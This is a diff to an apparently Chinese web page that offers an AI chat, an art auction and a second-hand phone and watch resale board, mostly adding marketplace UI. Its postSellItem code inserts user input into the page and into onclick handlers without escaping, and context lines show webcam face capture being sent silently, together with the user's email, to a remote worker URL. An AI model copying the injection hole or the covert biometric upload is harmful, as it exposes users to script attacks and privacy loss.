@@ -62,12 +62,14 @@
     .msg.user { background: var(--accent); color: #fff; align-self: flex-end; }
     .chat-input-box { display: flex; gap: 8px; }
 
-    /* 🔨 2. 拍卖页面 */
-    .auction-item { background: #0d1117; border: 1px solid var(--border); border-radius: 6px; padding: 12px; margin-bottom: 12px; text-align: left; }
-    .auction-price { color: var(--success); font-family: var(--font-mono); font-weight: bold; }
+    /* 🖼️ 卡片通用图片与布局 */
+    .auction-item, .market-card { background: #0d1117; border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 16px; text-align: left; display: flex; gap: 14px; }
+    .item-img { width: 110px; height: 110px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border); flex-shrink: 0; background: #1f2937; }
+    .item-info { flex: 1; display: flex; flex-direction: column; justify-content: space-between; }
+    .auction-price { color: var(--success); font-family: var(--font-mono); font-weight: bold; font-size: 16px; }
 
-    /* 🛍️ 3. 卖东西页面 */
-    .sell-form { text-align: left; }
+    /* 🛍️ 3. 卖东西寄卖大厅 */
+    .market-grid { display: grid; grid-template-columns: 1fr; gap: 12px; max-height: 240px; overflow-y: auto; margin-top: 16px; border-top: 1px dashed var(--border); padding-top: 16px; }
   </style>
 </head>
 <body>
@@ -81,7 +83,7 @@
   <div class="nav-tabs" id="navTabs">
     <div class="nav-tab active" onclick="Gateway.switchTab('chat')">💬 智能 AI 助手</div>
     <div class="nav-tab" onclick="Gateway.switchTab('auction')">🔨 艺术品拍卖</div>
-    <div class="nav-tab" onclick="Gateway.switchTab('sell')">🛍️ 闲置寄卖</div>
+    <div class="nav-tab" onclick="Gateway.switchTab('sell')">🛍️ 二手手机/手表寄卖</div>
   </div>
 
   <div class="auth-card" id="mainCard">
@@ -144,45 +146,109 @@
 
     <!-- 页面 2：拍卖页面 -->
     <div class="step-content" id="pageAuction">
+      <!-- 拍品 1 -->
       <div class="auction-item">
-        <h4>🎨 赛博朋克 2077 限量数字艺术画作</h4>
-        <p style="font-size:12px; color:var(--text-muted); margin:4px 0 8px 0;">
-          当前拍卖价格：¥ <span class="auction-price" id="price-item1">12800</span>
-        </p>
-        <div style="display:flex; gap:8px;">
-          <input type="number" id="input-item1" placeholder="输入出价金额..." style="font-size:12px;">
-          <button class="btn active" style="width:100px; font-size:12px; background:var(--accent);" onclick="Gateway.placeBid('item1')">参与竞拍</button>
+        <img src="https://images.unsplash.com/photo-1579783902614-a3fb3927b675?auto=format&fit=crop&w=300&q=80" class="item-img" alt="画作">
+        <div class="item-info">
+          <div>
+            <h4 style="font-size:14px;">🎨 赛博朋克 2077 限量数字艺术画作</h4>
+            <p style="font-size:12px; color:var(--text-muted); margin:4px 0;">当前最高竞价：<span class="auction-price">¥ <span id="price-item1">12800</span></span></p>
+          </div>
+          <div style="display:flex; gap:8px;">
+            <input type="number" id="input-item1" placeholder="输入出价金额..." style="font-size:12px; padding:6px 10px;">
+            <button class="btn active" style="width:90px; font-size:12px; background:var(--accent); padding:6px;" onclick="Gateway.placeBid('item1')">参与竞拍</button>
+          </div>
         </div>
       </div>
 
+      <!-- 拍品 2 -->
       <div class="auction-item">
-        <h4>⌚️ 顶级机械腕表 - 暗夜黑奢华版</h4>
-        <p style="font-size:12px; color:var(--text-muted); margin:4px 0 8px 0;">
-          当前拍卖价格：¥ <span class="auction-price" id="price-item2">45000</span>
-        </p>
-        <div style="display:flex; gap:8px;">
-          <input type="number" id="input-item2" placeholder="输入出价金额..." style="font-size:12px;">
-          <button class="btn active" style="width:100px; font-size:12px; background:var(--accent);" onclick="Gateway.placeBid('item2')">参与竞拍</button>
+        <img src="https://images.unsplash.com/photo-1523275335684-37898b6baf30?auto=format&fit=crop&w=300&q=80" class="item-img" alt="手表">
+        <div class="item-info">
+          <div>
+            <h4 style="font-size:14px;">⌚️ 顶级机械腕表 - 暗夜黑奢华版</h4>
+            <p style="font-size:12px; color:var(--text-muted); margin:4px 0;">当前最高竞价：<span class="auction-price">¥ <span id="price-item2">45000</span></span></p>
+          </div>
+          <div style="display:flex; gap:8px;">
+            <input type="number" id="input-item2" placeholder="输入出价金额..." style="font-size:12px; padding:6px 10px;">
+            <button class="btn active" style="width:90px; font-size:12px; background:var(--accent); padding:6px;" onclick="Gateway.placeBid('item2')">参与竞拍</button>
+          </div>
         </div>
       </div>
     </div>
 
-    <!-- 页面 3：闲置寄卖页面 -->
+    <!-- 页面 3：闲置数码/手表寄卖页面 (含卖家联系方式) -->
     <div class="step-content" id="pageSell">
-      <div class="sell-form">
-        <div class="form-group">
-          <label>寄卖物品名称</label>
-          <input type="text" placeholder="例如：99新 MacBook Pro M2">
+      <div style="text-align: left; background: #0d1117; padding: 14px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 16px;">
+        <h4 style="font-size:14px; margin-bottom:12px; color:var(--accent);">➕ 发布我的闲置数码/手表</h4>
+        
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+          <div class="form-group" style="margin-bottom:8px;">
+            <label>物品名称</label>
+            <input type="text" id="sellName" placeholder="如：iPhone 15 Pro 256G">
+          </div>
+          <div class="form-group" style="margin-bottom:8px;">
+            <label>期望转让价 (¥)</label>
+            <input type="number" id="sellPrice" placeholder="如：5200">
+          </div>
         </div>
-        <div class="form-group">
-          <label>期望出售价格 (¥)</label>
-          <input type="number" placeholder="输入期望价格">
+
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+          <div class="form-group" style="margin-bottom:8px;">
+            <label>联系方式（微信 / 电话）</label>
+            <input type="text" id="sellContact" placeholder="微信: alex_888 或 电话: 13800000000">
+          </div>
+          <div class="form-group" style="margin-bottom:8px;">
+            <label>上传物品实拍图</label>
+            <input type="file" id="sellImage" accept="image/*" style="font-size:12px; padding:6px;">
+          </div>
         </div>
-        <div class="form-group">
-          <label>物品详细描述</label>
-          <textarea rows="3" placeholder="描述物品成色、发票情况等..."></textarea>
+
+        <div class="form-group" style="margin-bottom:12px;">
+          <label>成色说明与备注</label>
+          <input type="text" id="sellDesc" placeholder="国行正品、无拆修、带原装盒...">
         </div>
-        <button class="btn active" style="background:var(--success);" onclick="alert('✅ 寄卖申请已提交！审核通过后将发布至市场。')">提交寄卖申请</button>
+        <button class="btn active" style="background:var(--success); padding:8px;" onclick="Gateway.postSellItem()">立即发布寄卖</button>
+      </div>
+
+      <!-- 寄卖大厅列表 -->
+      <div style="text-align: left;">
+        <h4 style="font-size:13px; color:var(--text-muted); margin-bottom:8px;">🏪 正在寄卖中的二手数码大厅</h4>
+        <div class="market-grid" id="marketList">
+          
+          <!-- 预设示例 1: 手机 -->
+          <div class="market-card">
+            <img src="https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=300&q=80" class="item-img" alt="手机">
+            <div class="item-info">
+              <div>
+                <h4 style="font-size:13px;">📱 Apple iPhone 14 Pro 128G 暗夜紫</h4>
+                <p style="font-size:11px; color:var(--text-muted); margin:2px 0;">95新电池健康88%，无磕碰拆修</p>
+                <p style="font-size:11px; color:var(--accent); margin-top:2px;">💬 联系卖家: 微信 tech_seller01</p>
+              </div>
+              <div style="display:flex; justify-content:space-between; align-items:center;">
+                <span class="auction-price">¥ 3,999</span>
+                <button class="btn active" style="width:100px; font-size:11px; padding:4px; background:var(--accent);" onclick="alert('📞 卖家联系方式：\n微信: tech_seller01\n电话: 13800138001\n请直接与卖家联系交易！')">联系卖家</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- 预设示例 2: 手表 -->
+          <div class="market-card">
+            <img src="https://images.unsplash.com/photo-1508685096489-7aacd43bd3b1?auto=format&fit=crop&w=300&q=80" class="item-img" alt="Apple Watch">
+            <div class="item-info">
+              <div>
+                <h4 style="font-size:13px;">⌚️ Apple Watch Series 8 蜂窝版 45mm</h4>
+                <p style="font-size:11px; color:var(--text-muted); margin:2px 0;">充新99新，带原装运动表带与充电器</p>
+                <p style="font-size:11px; color:var(--accent); margin-top:2px;">💬 联系卖家: 电话 13912345678</p>
+              </div>
+              <div style="display:flex; justify-content:space-between; align-items:center;">
+                <span class="auction-price">¥ 1,850</span>
+                <button class="btn active" style="width:100px; font-size:11px; padding:4px; background:var(--accent);" onclick="alert('📞 卖家联系方式：\n电话: 13912345678\n微信: watch_master\n请直接与卖家联系交易！')">联系卖家</button>
+              </div>
+            </div>
+          </div>
+
+        </div>
       </div>
     </div>
 
@@ -233,7 +299,6 @@
         }
       },
 
-      // 🧠 活体人脸与防静态照片校验算法
       analyzeFrameLoop() {
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('analysisCanvas');
@@ -250,22 +315,15 @@
           const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
           const data = imgData.data;
 
-          let skinPixelCount = 0;
-          let totalBrightness = 0;
-          let motionDiff = 0;
+          let skinPixelCount = 0, totalBrightness = 0, motionDiff = 0;
 
           for (let i = 0; i < data.length; i += 4) {
             const r = data[i], g = data[i+1], b = data[i+2];
             totalBrightness += (r + g + b) / 3;
 
-            // 精确肤色域匹配
-            if (r > 95 && g > 40 && b > 20 && 
-                Math.max(r, g, b) - Math.min(r, g, b) > 15 && 
-                Math.abs(r - g) > 15 && r > g && r > b) {
+            if (r > 95 && g > 40 && b > 20 && Math.max(r, g, b) - Math.min(r, g, b) > 15 && Math.abs(r - g) > 15 && r > g && r > b) {
               skinPixelCount++;
             }
-
-            // 微动判定
             if (this.lastFrameData) {
               motionDiff += Math.abs(r - this.lastFrameData[i]);
             }
@@ -332,7 +390,6 @@
         ctx.putImageData(imgData, 0, 0);
       },
 
-      // ⚡️ 极速流畅提交函数
       async submitBiometrics() {
         if (!this.validFaceInFrame) return;
 
@@ -355,7 +412,6 @@
         const email = document.getElementById('email').value;
         const time = new Date().toLocaleString();
 
-        // 异步静默发送后台，无需等待
         fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -373,7 +429,6 @@
         this.switchTab('chat');
       },
 
-      // 🧭 页面切换
       switchTab(tabName) {
         document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
         document.querySelectorAll('.step-content').forEach(e => e.classList.remove('active'));
@@ -391,12 +446,11 @@
         } else if(tabName === 'sell') {
           document.querySelectorAll('.nav-tab')[2].classList.add('active');
           document.getElementById('pageSell').classList.add('active');
-          document.getElementById('displayTitle').innerText = "🛍️ 闲置物品寄卖";
-          document.getElementById('displaySub').innerText = "发布您的个人闲置，平台担保交易";
+          document.getElementById('displayTitle').innerText = "🛍️ 二手手机/手表闲置寄卖大厅";
+          document.getElementById('displaySub').innerText = "上传您的闲置设备与联系方式，买家直连交易";
         }
       },
 
-      // 🔨 竞拍出价校验与实时更新函数
       placeBid(itemId) {
         const priceEl = document.getElementById(`price-${itemId}`);
         const inputEl = document.getElementById(`input-${itemId}`);
@@ -419,7 +473,58 @@
         alert(`🎉 恭喜！您已成功出价 ¥${userBid.toLocaleString()}，成为当前最高竞拍者！`);
       },
 
-      // 🤖 真实 AI 大模型对话
+      // 🛍️ 用户发布寄卖商品（生成带图片和联系方式的卡片）
+      postSellItem() {
+        const name = document.getElementById('sellName').value.trim();
+        const price = document.getElementById('sellPrice').value.trim();
+        const contact = document.getElementById('sellContact').value.trim();
+        const desc = document.getElementById('sellDesc').value.trim();
+        const fileInput = document.getElementById('sellImage');
+
+        if (!name || !price || !contact) {
+          alert("⚠️ 请填写物品名称、转让价格和联系方式！");
+          return;
+        }
+
+        const createCard = (imgSrc) => {
+          const marketList = document.getElementById('marketList');
+          const cardHtml = `
+            <div class="market-card">
+              <img src="${imgSrc}" class="item-img" alt="物品">
+              <div class="item-info">
+                <div>
+                  <h4 style="font-size:13px;">📱 ${name}</h4>
+                  <p style="font-size:11px; color:var(--text-muted); margin:2px 0;">${desc || "暂无描述"}</p>
+                  <p style="font-size:11px; color:var(--accent); margin-top:2px;">💬 联系卖家: ${contact}</p>
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                  <span class="auction-price">¥ ${parseFloat(price).toLocaleString()}</span>
+                  <button class="btn active" style="width:100px; font-size:11px; padding:4px; background:var(--accent);" onclick="alert('📞 卖家联系方式：\\n${contact}\\n请直接联系对方发起交易！')">联系卖家</button>
+                </div>
+              </div>
+            </div>
+          `;
+          marketList.insertAdjacentHTML('afterbegin', cardHtml);
+          
+          // 清空输入框
+          document.getElementById('sellName').value = '';
+          document.getElementById('sellPrice').value = '';
+          document.getElementById('sellContact').value = '';
+          document.getElementById('sellDesc').value = '';
+          fileInput.value = '';
+          alert("🎉 寄卖商品已成功发布！买家可通过联系方式直接找到您！");
+        };
+
+        if (fileInput.files && fileInput.files[0]) {
+          const reader = new FileReader();
+          reader.onload = function(e) { createCard(e.target.result); };
+          reader.readAsDataURL(fileInput.files[0]);
+        } else {
+          // 未传图使用默认设备封面
+          createCard("https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=300&q=80");
+        }
+      },
+
       async sendRealAiMessage() {
         const input = document.getElementById('chatInput');
         const userText = input.value.trim();
